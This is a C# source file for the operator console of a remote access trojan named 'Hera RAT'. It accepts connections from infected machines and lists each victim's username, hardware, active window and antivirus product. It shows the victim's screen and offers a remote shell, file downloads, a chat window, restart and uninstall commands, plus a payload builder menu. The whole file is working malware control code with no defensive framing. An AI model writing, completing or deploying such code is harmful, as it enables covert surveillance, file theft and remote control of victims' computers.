using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

namespace RAT
{
    public partial class Main : Form
    {
        public bool IsListening = false;
        public Thread ListenerThread;
        public bool ThreadKiller = true;
        public List<Client> ClientList = new List<Client>();

        public Main()
        {
            InitializeComponent();
        }

        public class Client
        {
            public Socket Connection { get; set; }
            public Thread Handler { get; set; }
            public String IP { get; set; }
            public String PCName { get; set; }
            public String Username { get; set; }
            public String CPU { get; set; }
            public String GPU { get; set; }
            public String RAMmax { get; set; }
            public String RAMcurr { get; set; }
            public String Motherboard { get; set; }
            public String CPUcurr { get; set; }
            public String ActiveWindow { get; set; }
            public String OS { get; set; }
            public String SystemArch { get; set; }
            public String Camera { get; set; }
            public String AntiVirus { get; set; }
            public Bitmap Screen { get; set; }
            public FrmShell ShellInstance { get; set; }
            public FrmChat ChatInstance { get; set; }
            public FrmRDP RDPInstance { get; set; }
            public FrmFun FunInstance { get; set; }
            public FrmFiles FilesInstance { get; set; }
            public String CurrentFileTransfer { get; set; }
            public int CurrentFileSizeRemaining { get; set; }
            public int CurrentFileSize { get; set; }
            public bool SecureReceive { get; set; } = false;
            public int CurrentChunkSize { get; set; }
        }

        public void ClientHandler(Client self, Main ParentForm)
        {
            self.Connection.Send(Encoding.ASCII.GetBytes("Confirmation Of Life"));
            byte[] Confirm = new byte[1024];
            int ConfirmBuff = self.Connection.Receive(Confirm);
            String ConfirmStr = Encoding.ASCII.GetString(Confirm, 0, ConfirmBuff);
            if (ConfirmStr == "Live And Well")
            {
                AddClient(self.IP, ParentForm);
                RefreshClientCount(ParentForm);
                self.Connection.Send(Encoding.ASCII.GetBytes("Info"));
                while (ThreadKiller)
                {
                    try
                    {
                        byte[] RecvBuffer = new byte[1048576];
                        int BufferSize = self.Connection.Receive(RecvBuffer);
                        //Handle Strings
                        try
                        {
                            String StringBuffer = Encoding.ASCII.GetString(RecvBuffer, 0, BufferSize);
                            if (StringBuffer != "")
                            {
                                List<String> Packet = StringBuffer.Split('|').ToList();
                                if (Packet[0] == "Detail")
                                {
                                    switch (Packet[1])
                                    {
                                        case "PC Name":
                                            self.PCName = Packet[2];
                                            break;
                                        case "Username":
                                            self.Username = Packet[2];
                                            break;
                                        case "CPU":
                                            self.CPU = Packet[2];
                                            break;
                                        case "GPU":
                                            self.GPU = Packet[2];
                                            break;
                                        case "RAM Max":
                                            self.RAMmax = Packet[2];
                                            break;
                                        case "RAM Curr":
                                            self.RAMcurr = Packet[2];
                                            break;
                                        case "Motherboard":
                                            self.Motherboard = Packet[2];
                                            break;
                                        case "CPU Usage":
                                            self.CPUcurr = Packet[2];
                                            break;
                                        case "Active Window":
                                            self.ActiveWindow = Packet[2];
                                            break;
                                        case "OS":
                                            self.OS = Packet[2];
                                            break;
                                        case "System Arch":
                                            self.SystemArch = Packet[2];
                                            break;
                                        case "Camera":
                                            self.Camera = Packet[2];
                                            break;
                                        case "AntiVirus":
                                            self.AntiVirus = Packet[2];
                                            break;
                                    }
                                    UpdateListClient(self, ParentForm);
                                    RefreshDetails(self, ParentForm);
                                }
                                else if (Packet[0] == "ShellResponse")
                                {
                                    if (self.ShellInstance != null)
                                    {
                                        self.ShellInstance.DisplayResult(Packet[1], self.Connection.RemoteEndPoint.ToString());
                                    }
                                    //MessageBox.Show(Packet[1]);
                                }
                                else if (Packet[0] == "MessageResponse")
                                {

                                    if (self.ChatInstance != null)
                                    {
                                        self.ChatInstance.DisplayClientMessage(Packet[1], self.Connection.RemoteEndPoint.ToString());
                                    }
                                }
                                else if (Packet[0] == "FileDetail")
                                {
                                    switch (Packet[1])
                                    {
                                        case "ReturnDirectory":
                                            if (Packet[2] == "" || Packet[2] == null)
                                            {
                                                //Error!
                                                MessageBox.Show(StringBuffer);
                                            }
                                            else
                                            {
                                                try
                                                {
                                                    List<String> Files = Packet[4].Split('*').ToList();
                                                    List<String> Directories = Packet[3].Split('*').ToList();
                                                    self.FilesInstance.UpdateDirectoryList(Directories, Files, Packet[2]);
                                                }
                                                catch (Exception ex)
                                                {
                                                    MessageBox.Show(ex.ToString(), "Error processing file list! " + Packet.Count().ToString());
                                                }
                                            }
                                            break;
                                        case "SetUpload":
                                            if (self.SecureReceive == true)
                                            {
                                                self.CurrentFileTransfer = Packet[2];
                                                self.CurrentFileSizeRemaining = Convert.ToInt32(Packet[3]);
                                                double ChunkSize = self.CurrentFileSizeRemaining / 50;
                                                int RealChunkSize = (int)ChunkSize + 1;
                                                if (RealChunkSize > 1000000)
                                                {
                                                    RealChunkSize = 750000;
                                                }
                                                self.CurrentChunkSize = RealChunkSize;
                                                self.CurrentFileSize = Convert.ToInt32(Packet[3]);
                                            }
                                            break;
                                        case "EndUpload":
                                            self.CurrentFileTransfer = "";
                                            self.CurrentFileSizeRemaining = 0;
                                            self.SecureReceive = false;
                                            self.CurrentChunkSize = 0;
                                            self.CurrentFileSize = 0;
                                            break;
                                        case "ConfirmChunkRecv":
                                            self.FilesInstance.ChunkConfirmed();
                                            break;
                                        default:
                                            MessageBox.Show(Packet[1], "Error! Unhandled Command.");
                                            break;
                                    }
                                }
                                else
                                {
                                    if (RecvBuffer[0] == Encoding.ASCII.GetBytes("&".ToCharArray())[0])
                                    {
                                        List<Byte> BufferList = RecvBuffer.ToList();
                                        BufferList.RemoveAt(0);
                                        RecvBuffer = BufferList.ToArray();
                                        Bitmap CurrScreen = null;
                                        using (MemoryStream ms = new MemoryStream(RecvBuffer))
                                        {
                                            CurrScreen = new Bitmap(ms);
                                        }
                                        if (self.RDPInstance != null)
                                        {
                                            self.RDPInstance.SetDesktopImage(CurrScreen);
                                        }
                                    }
                                    else if (RecvBuffer[0] == Encoding.ASCII.GetBytes("$".ToCharArray())[0])
                                    {
                                        if (self.CurrentFileTransfer != "" && self.SecureReceive == true)
                                        {
                                            List<byte> BufferList = RecvBuffer.ToList();
                                            BufferList.RemoveAt(0);
                                            RecvBuffer = BufferList.ToArray();
                                            using (FileStream fs = new FileStream(self.CurrentFileTransfer, FileMode.Append, FileAccess.Write))
                                            {
                                                fs.Write(RecvBuffer, 0, self.CurrentFileSizeRemaining);
                                                fs.Close();
                                            }
                                            self.CurrentFileTransfer = "";
                                            self.CurrentFileSizeRemaining = 0;
                                            self.CurrentFileSize = 0;
                                            self.SecureReceive = false;
                                            self.Connection.Send(Encoding.ASCII.GetBytes("DownloadConfirm"));
                                            self.FilesInstance.UpdateTitle("END", self.FilesInstance);
                                            //Handle Write Chunk
                                        }
                                    }
                                    else if (RecvBuffer[0] == Encoding.ASCII.GetBytes("@".ToCharArray())[0])
                                    {
                                        if (self.CurrentFileTransfer != "" && self.SecureReceive == true)
                                        {
                                            List<byte> BufferList = RecvBuffer.ToList();
                                            BufferList.RemoveAt(0);
                                            RecvBuffer = BufferList.ToArray();
                                            using (FileStream fs = new FileStream(self.CurrentFileTransfer, FileMode.Append, FileAccess.Write))
                                            {
                                                fs.Write(RecvBuffer, 0, self.CurrentChunkSize);
                                                fs.Close();
                                            }
                                            self.CurrentFileSizeRemaining = self.CurrentFileSizeRemaining - self.CurrentChunkSize;
                                            self.FilesInstance.UpdateTitle((self.CurrentFileSize - self.CurrentFileSizeRemaining).ToString() + " / " + self.CurrentFileSize.ToString(), self.FilesInstance);
                                            self.Connection.Send(Encoding.ASCII.GetBytes("DownloadConfirm"));
                                        }
                                    }
                                    else
                                    {
                                        try
                                        {
                                            Bitmap CurrScreen = null;
                                            using (MemoryStream ms = new MemoryStream(RecvBuffer))
                                            {
                                                CurrScreen = new Bitmap(ms);
                                            }
                                            self.Screen = CurrScreen;
                                            RefreshDetails(self, ParentForm);
                                        }
                                        catch
                                        {
                                            //MessageBox.Show("Error!");
                                        }
                                    }
                                }
                            }
                            else
                            {
                                break;
                            }
                        }
                        catch
                        {

                        }
                    }
                    catch (Exception ex)
                    {
                        break;
                    }
                }
            }
            RemoveClient(self.Connection.RemoteEndPoint.ToString(), self.Connection, ParentForm);
            RefreshClientCount(ParentForm);
        }

        public void UpdateClientDownload(Socket client)
        {
            foreach (Client CurrClient in ClientList)
            {
                if (CurrClient.Connection.RemoteEndPoint.ToString() == client.RemoteEndPoint.ToString())
                {
                    CurrClient.SecureReceive = true;
                }
            }
        }

        public void RefreshDetails(Client self, Main ParentForm)
        {
            if (ParentForm.listView1.InvokeRequired)
            {
                ParentForm.listView1.BeginInvoke((MethodInvoker)delegate ()
                {
                    try
                    {
                        if (ParentForm.listView1.SelectedItems[0].Text == self.IP)
                        {
                            UpdateClientDetailList(self, ParentForm);
                        }
                    }
                    catch
                    {

                    }
                });
            }
            else
            {
                try
                {
                    if (ParentForm.listView1.SelectedItems[0].Text == self.IP)
                    {
                        UpdateClientDetailList(self, ParentForm);
                    }
                }
                catch
                {

                }
            }
        }

        public void RefreshClientCount(Main ParentForm)
        {
            if (ParentForm.InvokeRequired)
            {
                ParentForm.BeginInvoke((MethodInvoker)delegate ()
               {
                   ParentForm.Text = "Hera RAT - Connected : " + ParentForm.listView1.Items.Count.ToString();
               });
            }
            else
            {
                ParentForm.Text = "Hera RAT - Connected : " + ParentForm.listView1.Items.Count.ToString();
            }
        }

        public void UpdateListClient(Client CurrClient, Main ParentForm)
        {
            if (ParentForm.listView1.InvokeRequired)
            {
               ParentForm.listView1.BeginInvoke((MethodInvoker)delegate ()
               {
                   foreach (ListViewItem lvi in ParentForm.listView1.Items)
                   {
                       if (lvi.Text == CurrClient.IP)
                       {
                           lvi.SubItems.Clear();
                           lvi.Text = CurrClient.IP;
                           lvi.SubItems.Add(CurrClient.PCName);
                           lvi.SubItems.Add(CurrClient.Username);
                           lvi.SubItems.Add(CurrClient.CPU);
                           lvi.SubItems.Add(CurrClient.GPU);
                       }
                   }
               });
            }
            else
            {
                foreach (ListViewItem lvi in ParentForm.listView1.Items)
                {
                    if (lvi.Text == CurrClient.IP)
                    {
                        lvi.SubItems.Clear();
                        lvi.Text = CurrClient.IP;
                        lvi.SubItems.Add(CurrClient.PCName);
                        lvi.SubItems.Add(CurrClient.Username);
                        lvi.SubItems.Add(CurrClient.CPU);
                        lvi.SubItems.Add(CurrClient.GPU);
                    }
                }
            }
        }

        public void Listener(int Port, Main ParentForm)
        {
            try
            {
                IPAddress ListenIP = IPAddress.Any;
                IPEndPoint localEndPoint = new IPEndPoint(ListenIP, Port);
                Socket ServerSocket = new Socket(ListenIP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                ServerSocket.Bind(localEndPoint);
                ServerSocket.Listen(6000);
                while (ThreadKiller)
                {
                    try
                    {
                        IAsyncResult Accepted;
                        Action action = () =>
                        {
                            Client TempPtr = new Client();
                            TempPtr.Connection = ServerSocket.Accept();
                            TempPtr.Handler = new Thread((new ThreadStart(() => ClientHandler(TempPtr, ParentForm))));
                            TempPtr.IP = TempPtr.Connection.RemoteEndPoint.ToString();
                            ClientList.Add(TempPtr);
                            ClientList[ClientList.Count - 1].Handler.Start();
                        };
                        Accepted = action.BeginInvoke(null, null);
                        Accepted.AsyncWaitHandle.WaitOne(5000);
                    }
                    catch
                    {
                        
                    }
                }
                ServerSocket.Close();
                IsListening = false;
                UpdateStatus("Idle...", ParentForm);
            }
            catch(Exception ex)
            {
                using (StreamWriter ErrorDump = new StreamWriter(DateTime.Now.ToString() + "-Error.log", true))
                {
                    ErrorDump.WriteLine(ex.ToString() + Environment.NewLine);
                }
                MessageBox.Show("The socket failed to open! Is another program using the port?", "Error!");
            }
        }

        public void StartListener(int Port, Main ParentForm)
        {
            
                ListenerThread = new Thread((new ThreadStart(() => Listener(Port, ParentForm))));
                ListenerThread.Start();
                IsListening = true;
                UpdateStatus("Listening on Port " + Port.ToString(), ParentForm);
        }

        public void StopListener()
        {
            ThreadKiller = false;
            IsListening = false;
        }

        public void UpdateStatus(String UpdateStatus, Main FormInstance)
        {
            if (FormInstance.label1.InvokeRequired)
            {
                FormInstance.label1.BeginInvoke((MethodInvoker)delegate () 
                {
                    label1.Text = "Status : " + UpdateStatus;
                });
            }
            else
            {
                label1.Text = "Status : " + UpdateStatus;
            }
        }

        public void AddClient(String IP, Main FormInstance)
        {
            if (FormInstance.listView1.InvokeRequired)
            {
                FormInstance.listView1.BeginInvoke((MethodInvoker)delegate () 
                {
                    FormInstance.listView1.Items.Add(IP);
                });
            }
            else
            {
                FormInstance.listView1.Items.Add(IP);
            }
        }

        public void RemoveClient(String IP, Socket ClientSocket, Main FormInstance)
        {
            if (FormInstance.listView1.InvokeRequired)
            {
               FormInstance.listView1.BeginInvoke((MethodInvoker)delegate ()
               {
                   try
                   {
                       foreach (ListViewItem lvi in FormInstance.listView1.Items)
                       {
                           if (lvi.Text == IP)
                           {
                               try
                               {
                                   foreach (Client CurrClient in ClientList)
                                   {
                                       if (CurrClient.IP == IP)
                                       {
                                           CurrClient.Connection.Close();
                                           CurrClient.Handler.Abort();
                                       }
                                   }
                                   FormInstance.listView1.Items.Remove(lvi);
                               }
                               catch (Exception ex)
                               {
                                   MessageBox.Show(ex.ToString());
                                   FormInstance.listView1.Items.Remove(lvi);
                               }
                           }
                       }
                   }
                   catch (Exception ex)
                   {
                       MessageBox.Show(ex.ToString());
                   }
               });
            }
            else
            {
                try
                {
                    foreach (ListViewItem lvi in FormInstance.listView1.Items)
                    {
                        if (lvi.Text == IP)
                        {
                            try
                            {
                                foreach (Client CurrClient in ClientList)
                                {
                                    if (CurrClient.Connection.RemoteEndPoint.ToString() == IP)
                                    {
                                        CurrClient.Connection.Close();
                                        CurrClient.Handler.Abort();
                                    }
                                }
                                FormInstance.listView1.Items.Remove(lvi);
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(ex.ToString());
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                if (listView1.FocusedItem.Bounds.Contains(e.Location))
                {
                    contextMenuStrip1.Show(Cursor.Position);
                }
            }
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Settings FrmSettings = new Settings(IsListening, this);
            FrmSettings.Show();
            FrmSettings.Focus();
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            About FrmAbout = new About();
            FrmAbout.Show();
            FrmAbout.Focus();
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Builder FrmBuild = new Builder();
            FrmBuild.Show();
            FrmBuild.Focus();
        }

        public void UpdateClientDetailList(Client client, Main ParentForm)
        {
            if (ParentForm.listView2.InvokeRequired)
            {
                ParentForm.listView2.BeginInvoke((MethodInvoker)delegate () 
                {
                    String TitleList = "";
                    foreach (ListViewItem lvi in ParentForm.listView2.Items)
                    {
                        TitleList = TitleList + lvi.Text + "|";
                    }
                    List<String> Titles = TitleList.Split('|').ToList();
                    ParentForm.listView2.Items.Clear();
                    foreach (String CurrTitle in Titles)
                    {

                        if (CurrTitle != "" && CurrTitle != "   " && CurrTitle != " ")
                        {
                            listView2.Items.Add(CurrTitle);
                        }
                    }
                    ParentForm.listView2.Items[0].SubItems.Add(client.IP);
                    ParentForm.listView2.Items[1].SubItems.Add(client.PCName);
                    ParentForm.listView2.Items[2].SubItems.Add(client.Username);
                    ParentForm.listView2.Items[3].SubItems.Add(client.CPU);
                    ParentForm.listView2.Items[4].SubItems.Add(client.GPU);
                    ParentForm.listView2.Items[5].SubItems.Add(client.RAMmax);
                    ParentForm.listView2.Items[6].SubItems.Add(client.RAMcurr);
                    ParentForm.listView2.Items[7].SubItems.Add(client.Motherboard);
                    ParentForm.listView2.Items[8].SubItems.Add(client.CPUcurr);
                    ParentForm.listView2.Items[9].SubItems.Add(client.ActiveWindow);
                    ParentForm.listView2.Items[10].SubItems.Add(client.OS);
                    ParentForm.listView2.Items[11].SubItems.Add(client.SystemArch);
                    ParentForm.listView2.Items[12].SubItems.Add(client.Camera);
                    ParentForm.listView2.Items[13].SubItems.Add(client.AntiVirus);
                    if (ParentForm.checkBox1.Checked)
                    {
                        if (client.Screen != null)
                        {
                            ParentForm.pictureBox1.Image = client.Screen;
                        }
                    }
                });
            }
            else
            {
                String TitleList = "";
                foreach (ListViewItem lvi in ParentForm.listView2.Items)
                {
                    TitleList = TitleList + lvi.Text + "|";
                }
                List<String> Titles = TitleList.Split('|').ToList();
                ParentForm.listView2.Items.Clear();
                foreach (String CurrTitle in Titles)
                {
                    if (CurrTitle != "" && CurrTitle != "   " && CurrTitle != " ")
                    {
                        listView2.Items.Add(CurrTitle);
                    }
                }
                ParentForm.listView2.Items[0].SubItems.Add(client.IP);
                ParentForm.listView2.Items[1].SubItems.Add(client.PCName);
                ParentForm.listView2.Items[2].SubItems.Add(client.Username);
                ParentForm.listView2.Items[3].SubItems.Add(client.CPU);
                ParentForm.listView2.Items[4].SubItems.Add(client.GPU);
                ParentForm.listView2.Items[5].SubItems.Add(client.RAMmax);
                ParentForm.listView2.Items[6].SubItems.Add(client.RAMcurr);
                ParentForm.listView2.Items[7].SubItems.Add(client.Motherboard);
                ParentForm.listView2.Items[8].SubItems.Add(client.CPUcurr);
                ParentForm.listView2.Items[9].SubItems.Add(client.ActiveWindow);
                ParentForm.listView2.Items[10].SubItems.Add(client.OS);
                ParentForm.listView2.Items[11].SubItems.Add(client.SystemArch);
                ParentForm.listView2.Items[12].SubItems.Add(client.Camera);
                ParentForm.listView2.Items[13].SubItems.Add(client.AntiVirus);
                if (ParentForm.checkBox1.Checked)
                {
                    if (client.Screen != null)
                    {
                        try
                        {
                            ParentForm.pictureBox1.Image = client.Screen;
                        }
                        catch
                        {

                        }
                    }
                }
            }
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            { 
                String TitleList = "";
                foreach (ListViewItem lvi in listView2.Items)
                {
                    TitleList = TitleList + lvi.Text + "|";
                }
                List<String> Titles = TitleList.Split('|').ToList();
                foreach (Client CurrClient in ClientList)
                {
                    if (listView1.SelectedItems[0].Text == CurrClient.IP)
                    {
                        listView2.Items.Clear();
                        foreach (String CurrTitle in Titles)
                        {
                            if (CurrTitle != "" && CurrTitle != "   " && CurrTitle != " ")
                            {
                                listView2.Items.Add(CurrTitle);
                            }
                        }
                        RefreshDetails(CurrClient, this);
                    }
                }
            }
            catch
            {
                String TitleList = "";
                foreach (ListViewItem lvi in listView2.Items)
                {
                    TitleList = TitleList + lvi.Text + "|";
                }
                List<String> Titles = TitleList.Split('|').ToList();
                listView2.Items.Clear();
                foreach (String CurrTitle in Titles)
                {
                    if (CurrTitle != "" && CurrTitle != "   " && CurrTitle != " ")
                    {
                        listView2.Items.Add(CurrTitle);
                    }
                }
                pictureBox1.Image = null;
            }
        }

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (Client CurrClient in ClientList)
                {
                    //MessageBox.Show(listView1.SelectedItems[0].Text, CurrClient.IP);
                    if (listView1.SelectedItems[0].Text == CurrClient.IP)
                    {
                        CurrClient.Connection.Send(Encoding.ASCII.GetBytes("SysCom|Close"));
                    }
                }
            }
            catch
            {

            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (Client CurrClient in ClientList)
                {
                    if (listView1.SelectedItems[0].Text == CurrClient.IP)
                    {
                        CurrClient.Connection.Send(Encoding.ASCII.GetBytes("SysCom|Restart"));
                    }
                }
            }
            catch
            {

            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (Client CurrClient in ClientList)
                {
                    if (listView1.SelectedItems[0].Text == CurrClient.IP)
                    {
                        CurrClient.Connection.Send(Encoding.ASCII.GetBytes("SysCom|Uninstall"));
                    }
                }
            }
            catch
            {

            }
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (Client CurrClient in ClientList)
                {
                    if (listView1.SelectedItems[0].Text == CurrClient.IP)
                    {
                        CurrClient.ShellInstance = new FrmShell(CurrClient.Connection);
                        CurrClient.ShellInstance.Show();
                        CurrClient.ShellInstance.Focus();
                    }
                }
            }
            catch
            {

            }
        }

        private void remoteChatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (Client CurrClient in ClientList)
                {
                    if (listView1.SelectedItems[0].Text == CurrClient.IP)
                    {
                        CurrClient.ChatInstance = new FrmChat(CurrClient.Connection);
                        CurrClient.ChatInstance.Show();
                        CurrClient.ChatInstance.Focus();
                    }
                }
            }
            catch
            {

            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            try
            {
                String TitleList = "";
                foreach (ListViewItem lvi in listView2.Items)
                {
                    TitleList = TitleList + lvi.Text + "|";
                }
                List<String> Titles = TitleList.Split('|').ToList();
                foreach (Client CurrClient in ClientList)
                {
                    if (listView1.SelectedItems[0].Text == CurrClient.IP)
                    {
                        listView2.Items.Clear();
                        foreach (String CurrTitle in Titles)
                        {
                            if (CurrTitle != "" && CurrTitle != "   " && CurrTitle != " ")
                            {
                                listView2.Items.Add(CurrTitle);
                            }
                        }
                        RefreshDetails(CurrClient, this);
                    }
                }
            }
            catch
            {
                String TitleList = "";
                foreach (ListViewItem lvi in listView2.Items)
                {
                    TitleList = TitleList + lvi.Text + "|";
                }
                List<String> Titles = TitleList.Split('|').ToList();
                listView2.Items.Clear();
                foreach (String CurrTitle in Titles)
                {
                    if (CurrTitle != "" && CurrTitle != "   " && CurrTitle != " ")
                    {
                        listView2.Items.Add(CurrTitle);
                    }
                }
                pictureBox1.Image = null;
            }
        }

        private void serverToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (Client CurrClient in ClientList)
                {
                    if (listView1.SelectedItems[0].Text == CurrClient.IP)
                    {
                        CurrClient.RDPInstance = new FrmRDP(CurrClient.Connection);
                        CurrClient.RDPInstance.Show();
                        CurrClient.RDPInstance.Focus();
                    }
                }
            }
            catch
            {
                
            }
        }

        private void forceRemoveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (Client CurrClient in ClientList)
                {
                    if (listView1.SelectedItems[0].Text == CurrClient.IP)
                    {
                        RemoveClient(CurrClient.Connection.RemoteEndPoint.ToString(), CurrClient.Connection, this);
                        RefreshClientCount(this);
                    }
                }
            }
            catch
            {

            }
        }

        private void systemManagementToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (Client CurrClient in ClientList)
                {
                    if (listView1.SelectedItems[0].Text == CurrClient.IP)
                    {
                        CurrClient.FunInstance = new FrmFun(CurrClient.Connection);
                        CurrClient.FunInstance.Show();
                        CurrClient.FunInstance.Focus();
                    }
                }
            }
            catch
            {

            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (Client CurrClient in ClientList)
                {
                    if (listView1.SelectedItems[0].Text == CurrClient.IP)
                    {
                        CurrClient.FilesInstance = new FrmFiles(CurrClient.Connection, this);
                        CurrClient.FilesInstance.Show();
                        CurrClient.FilesInstance.Focus();
                    }
                }
            }
            catch
            {

            }
        }

        private void Main_FormClosed(object sender, FormClosedEventArgs e)
        {
            Environment.Exit(0);
        }
    }
}
